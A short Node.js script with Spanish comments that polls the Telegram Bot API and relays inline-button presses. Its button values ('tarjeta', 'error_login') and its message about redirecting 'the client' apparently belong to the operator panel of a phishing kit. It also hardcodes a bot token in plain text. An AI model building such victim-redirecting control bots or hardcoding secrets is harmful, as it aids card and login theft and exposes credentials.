const axios = require('axios');

// Configuración de credenciales fijas
const TOKEN = "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";
const URL_API = `https://api.telegram.org/bot${TOKEN}`;

// Variable para controlar qué mensajes o clics ya procesamos y no repetirlos
let lastUpdateId = 0;

// Función para responderle a Telegram cuando presionas un botón
async function procesarBoton(callbackQuery) {
    const data = callbackQuery.data; // 'tarjeta', 'error_login', etc.
    const chatId = callbackQuery.message.chat.id;

    try {
        // Le avisamos a Telegram que recibimos el clic para que el botón deje de parpadear
        await axios.post(`${URL_API}/answerCallbackQuery`, {
            callback_query_id: callbackQuery.id,
            text: `Comando enviado: ${data.toUpperCase()}`
        });

        // Enviamos confirmación visual al chat/grupo
        await axios.post(`${URL_API}/sendMessage`, {
            chat_id: chatId,
            text: `🎯 *Comando detectado:* Redirigiendo al cliente a: \`${data}\``,
            parse_mode: 'Markdown'
        });
        
        console.log(`[BOT] Botón presionado detectado con éxito: ${data}`);
    } catch (error) {
        console.error("Error al procesar el botón de Telegram:", error.message);
    }
}

// Bucle continuo para escuchar clics en los botones sin usar librerías pesadas
async function iniciarPolling() {
    console.log("🚀 El Bot de Telegram está encendido y escuchando tus comandos...");
    
    while (true) {
        try {
            // Le pedimos a Telegram los nuevos eventos ocurridos en el chat
            const respuesta = await axios.get(`${URL_API}/getUpdates`, {
                params: {
                    offset: lastUpdateId + 1,
                    timeout: 30 // Mantiene la conexión abierta esperando eventos
                }
            });

            const updates = respuesta.data.result;

            if (updates && updates.length > 0) {
                for (const update of updates) {
                    lastUpdateId = update.update_id;

                    // Si el evento es que el administrador presionó un botón Inline
                    if (update.callback_query) {
                        await procesarBoton(update.callback_query);
                    }
                }
            }
        } catch (error) {
            console.error("Error en el ciclo de escucha (Polling):", error.message);
            // Esperamos 5 segundos antes de reintentar si se cae el internet
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

// Arranca el servidor de escucha en tu PC
iniciarPolling();
